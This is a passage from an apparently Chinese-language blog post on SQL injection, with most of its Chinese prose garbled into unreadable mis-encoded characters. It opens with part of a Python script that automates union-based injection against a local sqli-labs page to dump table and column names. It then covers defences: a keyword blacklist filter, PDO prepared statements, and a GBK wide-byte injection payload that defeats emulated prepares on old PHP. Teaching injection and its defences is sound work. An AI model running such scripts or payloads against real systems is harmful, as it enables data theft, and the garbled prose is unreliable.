print(&quot;-------------------------Ê≠£Âú®ÁàÜ&quot; + payload_rep +&quot;Â∫ìÁöÑ&quot; + payload_table + &quot;Ë°®ÁöÑÂ≠óÊÆµ-------------------------&quot;) Boomcolumn(list, payload_tables,payload_columns) #ÊçïÊçâÁàÜÂá∫ÁöÑÂ≠óÊÆµ def sqlcol_back(html,payload_columns): try: soup = BeautifulSoup(html,&apos;html.parser&apos;) Col = soup.select(&quot;font &gt; font&quot;) NCol = Col[0].text NNCol = NCol.split(&apos;:&apos;)[2] num = len(NNCol.split(&apos;,&apos;)) for i in range(num): payload_columns.append(NNCol.split(&apos;,&apos;)[i]) print(payload_columns[i]) except: print(&quot;sqlcol_back error&quot;) #ÁàÜÂ≠óÊÆµ def Boomcolumn(list, payload_tables,payload_columns): for payload_table in payload_tables: newurl = list + &quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;&quot; + payload_table + &quot;&apos; --+&quot; html = getHTMLText(newurl) sqlcol_back(html, payload_columns) def main(): lists = [] #Âà§Êñ≠ÊòØÂê¶ÊúâÊ≥®ÂÖ•ÁÇπÁöÑurl payload_reps = [] #ÁàÜÂá∫Êù•ÁöÑÂ∫ìÁöÑÂàóË°® payload_tables = [] #ÁàÜÂá∫Êù•ÁöÑË°®ÁöÑÂàóË°®„ÄÅ payload_columns = [] #ÁàÜÂá∫Êù•ÁöÑÂ≠óÊÆµ start_url = &apos;https://127.0.0.1/sqli-labs-master/Less-1/?id=-1&apos; testsql(start_url,lists) print(&quot;-----------------------Ê≠£Âú®ÁàÜÂ∫ì--------------------------&quot;) BoomRepository(lists[0], payload_reps) print(&quot;------------------------Ê≠£Âú®ÁàÜË°®--------------------------&quot;) BoomTable(lists[0], payload_columns, payload_tables, payload_reps) main() 0x11Â¶Ç‰ΩïÈò≤Âæ°Ôºü ÂºïÂèëSQLÊ≥®ÂÖ•ÊºèÊ¥ûÁöÑÂéüÂõ†ÔºöÂä®ÊÄÅSQLÊàñËÄÖÂ∞ÜSQLÊü•ËØ¢ÁªÑË£ÖÊàêÂåÖÂê´ÂèóÁî®Êà∑ÊéßÂà∂ÁöÑËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤Âπ∂Êèê‰∫§ÁªôÊï∞ÊçÆÂ∫ì ‰ΩøÁî®ÈªëÂêçÂçïÈ™åËØÅÊàë‰ª¨ËøõË°åSQLÊ≥®ÂÖ•ÁöÑÊó∂ÂÄôËÇØÂÆöÁ¶ª‰∏çÂºÄËøô‰∫õÂÖ≥ÈîÆËØçÔºö and„ÄÅor„ÄÅorder insert„ÄÅinto delete replace„ÄÅupdate union„ÄÅselect load_file„ÄÅoutfile Âíå‰∏Ä‰∫õÁâπÊÆäÁ¨¶Âè∑ ÂÖ∑‰ΩìÁöÑÂÆûÁé∞‰ª£Á†ÅÔºö private function filter_keyword( $string ) { $keyword=&apos;select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|and|union|order|or|into|load_file|outfile&apos;; $arr = explode( &apos;|&apos;, $keyword ); $result = str_ireplace( $arr, &apos;&apos;, $string ); return $result; } ÂΩìÁÑ∂ËøôÈáåËøôÊòØ‰∏Ä‰∏™Âü∫Êú¨ÁöÑÊÄùË∑ØÔºåÂÆûÈôÖÁéØÂ¢É‰∏≠ËøòÈúÄË¶ÅÊõ¥Âº∫Â§ßÁöÑÊ≠£ÂàôÊù•ËøõË°åÈªëÂêçÂçïËøáÊª§„ÄÇ Ê≠£Á°Æ‰ΩøÁî®ËøáÊª§ÊñπÂºè1.gpc/runtimeÈ≠îÊúØÂºïÂè∑ÔºöbugÊù•Ê∫êÊó†Èùû‰∏§ÁßçÊñπÂºèÔºå‰∏ÄÁßçÊòØ‰ªéÁ±ª‰ºº‰∫éget„ÄÅpostÁ≠â‰∏≠Ë¢´Âä®ÂºèÁöÑËé∑ÂæóÂèÇÊï∞;ËøòÊúâ‰∏ÄÁßçÊòØ‰∏ªÂä®ÁöÑËé∑ÂæóÂèÇÊï∞ÔºåÊØîÂ¶ÇËØªÂèñËøúÁ®ãÈ°µÈù¢ÊàñËÄÖÊñá‰ª∂„ÄÇÊâÄ‰ª•gpc/runtimeÂú®ËøôÂ∞±ÂæàÈáçË¶Å‰∫Ü„ÄÇ2.addslashesÂáΩÊï∞(Â≠óÁ¨¶ÂûãÈò≤Âæ°)„ÄÅmysql_[real_]escape_stringÂáΩÊï∞„ÄÅintvalÂáΩÊï∞Á≠âÁ≠â ‰ΩøÁî®È¢ÑÂ§ÑÁêÜËØ≠Âè•ÔºöPDO ‰ªÄ‰πàÊòØPDOÔºüPDOÊòØPHP Data ObjectsÔºàphpÊï∞ÊçÆÂØπË±°ÔºâÁöÑÁº©ÂÜô„ÄÇÊòØÂú®php5.1ÁâàÊú¨‰πãÂêéÂºÄÂßãÊîØÊåÅpdo„ÄÇ‰Ω†ÂèØ‰ª•ÊääpdoÁúãÂÅöÊòØphpÊèê‰æõÁöÑ‰∏Ä‰∏™Á±ª„ÄÇÂÆÉÊèê‰æõ‰∫Ü‰∏ÄÁªÑÊï∞ÊçÆÂ∫ìÊäΩË±°Â±ÇAPIÔºå‰ΩøÂæóÁºñÂÜôphp‰ª£Á†Å‰∏çÂÜçÂÖ≥ÂøÉÂÖ∑‰ΩìË¶ÅËøûÊé•ÁöÑÊï∞ÊçÆÂ∫ìÁ±ªÂûã„ÄÇ‰Ω†Êó¢ÂèØ‰ª•Áî®‰ΩøÁî®pdoËøûÊé•mysqlÔºå‰πüÂèØ‰ª•Áî®ÂÆÉËøûÊé•oracle„ÄÇÂπ∂‰∏îpdoÂæàÂ•ΩÁöÑËß£ÂÜ≥‰∫ÜsqlÊ≥®ÂÖ•ÈóÆÈ¢ò„ÄÇ ‰∏∫‰ªÄ‰πàË¶Å‰ΩøÁî®PDOÊü•ËØ¢?‰ΩøÁî®‰º†ÁªüÁöÑ mysql_connect „ÄÅmysql_queryÊñπÊ≥ïÊù•ËøûÊé•Êü•ËØ¢Êï∞ÊçÆÂ∫ìÊó∂ÔºåÂ¶ÇÊûúËøáÊª§‰∏ç‰∏•Á¥ßÔºåÂ∞±ÊúâSQLÊ≥®ÂÖ•È£éÈô©„ÄÇËôΩÁÑ∂ÂèØ‰ª•Áî®mysql_real_escape_string()ÂáΩÊï∞ËøáÊª§Áî®Êà∑Êèê‰∫§ÁöÑÂÄºÔºå‰ΩÜÊòØ‰πüÊúâÁº∫Èô∑„ÄÇËÄå‰ΩøÁî®PHPÁöÑPDOÊâ©Â±ïÁöÑ prepare ÊñπÊ≥ïÔºåÂ∞±ÂèØ‰ª•ÈÅøÂÖçsql injection È£éÈô©„ÄÇ ÂÖ∑‰ΩìÂÆûÁé∞ÊñπÊ≥ï$dbh = new PDO(&quot;mysql:host=localhost; dbname=demo&quot;, &quot;user&quot;, &quot;pass&quot;); $dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //Á¶ÅÁî®prepared statementsÁöÑ‰ªøÁúüÊïàÊûúÔºåÁ°Æ‰øù‰º†ÈÄíÂà∞mysqlÊúçÂä°Âô®‰πãÂâçÊ≤°ÊúâË¢´PHPËß£Êûê(Á¶ÅÊ≠¢‰∫ÜÊâÄÊúâÂèØËÉΩÁöÑsqlÊ≥®ÂÖ•) $dbh-&gt;exec(&quot;set names &apos;utf8&apos;&quot;); $sql=&quot;select * from test where name = ? and password = ?&quot;; $stmt = $dbh-&gt;prepare($sql); $exeres = $stmt-&gt;execute(array($testname, $pass)); if ($exeres) { while ($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC)) { print_r($row); } } $dbh = null; ÂÖ∂ÂÆûÂà∞ËøôÈáåÊàë‰πü‰∏çÊòØÂæàÊáÇÂéüÁêÜÔºåÁÑ∂ÂêéÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãËµÑÊñô‰∫ÜËß£‰∫Ü‰∏Ä‰∏ãPHP‰∏é mysql severÈÄöËÆØÁªÜËäÇÔºö ‰∏∫‰ΩïPDOËÉΩÈò≤SQLÊ≥®ÂÖ•ÔºüËØ∑ÂÖàÁúã‰ª•‰∏ãPHP‰ª£Á†ÅÔºö &lt;?php $pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;charset=utf8&quot;,&quot;root&quot;); $conn-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); // set the PDO error mode to exception $st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;); $id = 21; $name = &apos;zhangsan&apos;; $st-&gt;bindParam(1,$id); $st-&gt;bindParam(2,$name); $st-&gt;execute(); $st-&gt;fetchAll(); ?&gt; ÁéØÂ¢ÉÂ¶Ç‰∏ãÔºöPHP 5.4.7Mysql ÂçèËÆÆÁâàÊú¨ 10MySQL Server 5.5.27‰∏∫‰∫ÜÂΩªÂ∫ïÊêûÊ∏ÖÊ•öphp‰∏émysql serverÈÄöËÆØÁöÑÁªÜËäÇÔºåÊàëÁâπÂà´‰ΩøÁî®‰∫ÜwiresharkÊäìÂåÖËøõË°åÁ†îÁ©∂‰πã,ÂÆâË£Öwireshak‰πãÂêéÔºåÊàë‰ª¨ËÆæÁΩÆËøáÊª§Êù°‰ª∂‰∏∫tcp.port==3306, Â¶Ç‰∏ãÂõæÔºöÂ¶ÇÊ≠§Âè™ÊòæÁ§∫‰∏émysql 3306Á´ØÂè£ÁöÑÈÄö‰ø°Êï∞ÊçÆÔºåÈÅøÂÖç‰∏çÂøÖË¶ÅÁöÑÂπ≤Êâ∞„ÄÇÁâπÂà´Ë¶ÅÊ≥®ÊÑèÁöÑÊòØwireshakÂü∫‰∫éwincapÈ©±Âä®Ôºå‰∏çÊîØÊåÅÊú¨Âú∞ÁéØÂõûÊé•Âè£ÁöÑ‰æ¶Âê¨ÔºàÂç≥‰ΩøÁî®phpËøûÊé•Êú¨Âú∞mysqlÁöÑÊñπÊ≥ïÊòØÊó†Ê≥ï‰æ¶Âê¨ÁöÑÔºâÔºåËØ∑ËøûÊé•ÂÖ∂ÂÆÉÊú∫Âô®ÔºàÊ°•Êé•ÁΩëÁªúÁöÑËôöÊãüÊú∫‰πüÂèØÔºâÁöÑMySQLËøõË°åÊµãËØï„ÄÇÁÑ∂ÂêéËøêË°åÊàë‰ª¨ÁöÑPHPÁ®ãÂ∫èÔºå‰æ¶Âê¨ÁªìÊûúÂ¶Ç‰∏ãÔºåÊàë‰ª¨ÂèëÁé∞ÔºåPHPÂè™ÊòØÁÆÄÂçïÂú∞Â∞ÜSQLÁõ¥Êé•ÂèëÈÄÅÁªôMySQL Server :ÂÖ∂ÂÆûÔºåËøô‰∏éÊàë‰ª¨Âπ≥Êó∂‰ΩøÁî®mysql_real_escape_stringÂ∞ÜÂ≠óÁ¨¶‰∏≤ËøõË°åËΩ¨‰πâÔºåÂÜçÊãºÊé•ÊàêSQLËØ≠Âè•Ê≤°ÊúâÂ∑ÆÂà´ÔºàÂè™ÊòØÁî±PDOÊú¨Âú∞È©±Âä®ÂÆåÊàêËΩ¨‰πâÁöÑÔºâÔºåÊòæÁÑ∂ËøôÁßçÊÉÖÂÜµ‰∏ãËøòÊòØÊúâÂèØËÉΩÈÄ†ÊàêSQLÊ≥®ÂÖ•ÁöÑÔºå‰πüÂ∞±ÊòØËØ¥Âú®phpÊú¨Âú∞Ë∞ÉÁî®pdo prepare‰∏≠ÁöÑmysql_real_escape_stringÊù•Êìç‰ΩúqueryÔºå‰ΩøÁî®ÁöÑÊòØÊú¨Âú∞ÂçïÂ≠óËäÇÂ≠óÁ¨¶ÈõÜÔºåËÄåÊàë‰ª¨‰º†ÈÄíÂ§öÂ≠óËäÇÁºñÁ†ÅÁöÑÂèòÈáèÊó∂ÔºåÊúâÂèØËÉΩËøòÊòØ‰ºöÈÄ†ÊàêSQLÊ≥®ÂÖ•ÊºèÊ¥û(php 5.3.6‰ª•ÂâçÁâàÊú¨ÁöÑÈóÆÈ¢ò‰πã‰∏ÄÔºåËøô‰πüÂ∞±Ëß£Èáä‰∫Ü‰∏∫‰ΩïÂú®‰ΩøÁî®PDOÊó∂ÔºåÂª∫ËÆÆÂçáÁ∫ßÂà∞php 5.3.6+ÔºåÂπ∂Âú®DSNÂ≠óÁ¨¶‰∏≤‰∏≠ÊåáÂÆöcharsetÁöÑÂéüÂõ†„ÄÇÈíàÂØπphp 5.3.6‰ª•ÂâçÁâàÊú¨Ôºå‰ª•‰∏ã‰ª£Á†Å‰ªçÁÑ∂ÂèØËÉΩÈÄ†ÊàêSQLÊ≥®ÂÖ•ÈóÆÈ¢òÔºö $pdo-&gt;query(&apos;SET NAMES GBK&apos;); $var = chr(0xbf) . chr(0x27) . &quot; OR 1=1 /*&quot;; $query = &quot;SELECT * FROM info WHERE name = ?&quot;; $stmt = $pdo-&gt;prepare($query); $stmt-&gt;execute(array($var)); ÂéüÂõ†‰∏é‰∏äÈù¢ÁöÑÂàÜÊûêÊòØ‰∏ÄËá¥ÁöÑ„ÄÇËÄåÊ≠£Á°ÆÁöÑËΩ¨‰πâÂ∫îËØ•ÊòØÁªômysql ServerÊåáÂÆöÂ≠óÁ¨¶ÈõÜÔºåÂπ∂Â∞ÜÂèòÈáèÂèëÈÄÅÁªôMySQL ServerÂÆåÊàêÊ†πÊçÆÂ≠óÁ¨¶ËΩ¨‰πâ„ÄÇÈÇ£‰πàÔºåÂ¶Ç‰ΩïÊâçËÉΩÁ¶ÅÊ≠¢PHPÊú¨Âú∞ËΩ¨‰πâËÄå‰∫§Áî±MySQL ServerËΩ¨‰πâÂë¢ÔºüPDOÊúâ‰∏ÄÈ°πÂèÇÊï∞ÔºåÂêç‰∏∫PDO::ATTR_EMULATE_PREPARES ÔºåË°®Á§∫ÊòØÂê¶‰ΩøÁî®PHPÊú¨Âú∞Ê®°ÊãüprepareÔºåÊ≠§È°πÂèÇÊï∞ÈªòËÆ§ÂÄºÊú™Áü•„ÄÇËÄå‰∏îÊ†πÊçÆÊàë‰ª¨ÂàöÂàöÊäìÂåÖÂàÜÊûêÁªìÊûúÊù•ÁúãÔºåphp 5.3.6+ÈªòËÆ§ËøòÊòØ‰ΩøÁî®Êú¨Âú∞ÂèòÈáèËΩ¨ÔºåÊãºÊé•ÊàêSQLÂèëÈÄÅÁªôMySQL ServerÁöÑÔºåÊàë‰ª¨Â∞ÜËøôÈ°πÂÄºËÆæÁΩÆ‰∏∫false, ËØïËØïÊïàÊûúÔºåÂ¶Ç‰ª•‰∏ã‰ª£Á†ÅÔºö &lt;?php $pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;&quot;,&quot;root&quot;); $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;); $id = 21; $name = &apos;zhangsan&apos;; $st-&gt;bindParam(1,$id); $st-&gt;bindParam(2,$name); $st-&gt;execute(); $st-&gt;fetchAll(); ?&gt; Á∫¢Ëâ≤Ë°åÊòØÊàë‰ª¨ÂàöÂä†ÂÖ•ÁöÑÂÜÖÂÆπÔºåËøêË°å‰ª•‰∏ãÁ®ãÂ∫èÔºå‰ΩøÁî®wiresharkÊäìÂåÖÂàÜÊûêÔºåÂæóÂá∫ÁöÑÁªìÊûúÂ¶Ç‰∏ãÔºöÁúãÂà∞‰∫ÜÂêóÔºüËøôÂ∞±ÊòØÁ•ûÂ•á‰πãÂ§ÑÔºåÂèØËßÅËøôÊ¨°PHPÊòØÂ∞ÜSQLÊ®°ÊùøÂíåÂèòÈáèÊòØÂàÜ‰∏§Ê¨°ÂèëÈÄÅÁªôMySQLÁöÑÔºåÁî±MySQLÂÆåÊàêÂèòÈáèÁöÑËΩ¨‰πâÂ§ÑÁêÜÔºåÊó¢ÁÑ∂ÂèòÈáèÂíåSQLÊ®°ÊùøÊòØÂàÜ‰∏§Ê¨°ÂèëÈÄÅÁöÑÔºåÈÇ£‰πàÂ∞±‰∏çÂ≠òÂú®SQLÊ≥®ÂÖ•ÁöÑÈóÆÈ¢ò‰∫ÜÔºå‰ΩÜÈúÄË¶ÅÂú®DSN‰∏≠ÊåáÂÆöcharsetÂ±ûÊÄßÔºåÂ¶ÇÔºö $pdo = new PDO(&apos;mysql:host=localhost;dbname=test;charset=utf8&apos;, &apos;root&apos;); ÂèÇËÄÉÊñáÁåÆÔºöhttps://zhangxugg-163-com.iteye.com/blog/1835721]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQLÊ≥®ÂÖ•</tag>
      </tags>
  </entry>
</search>
